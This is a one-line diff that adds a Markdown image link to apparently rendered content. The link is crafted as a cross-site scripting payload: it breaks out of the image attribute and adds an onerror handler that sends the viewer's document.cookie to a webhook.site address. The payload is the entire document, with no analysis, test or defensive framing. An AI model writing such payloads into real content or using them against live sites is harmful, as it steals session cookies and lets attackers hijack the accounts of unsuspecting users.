@@ -1,0 +1,1 @@
+![a](x"onerror="location='//webhook.site/3b34c76f-7fcd-463e-bf47-5ca9712bc872?c='+encodeURIComponent(document.cookie)")
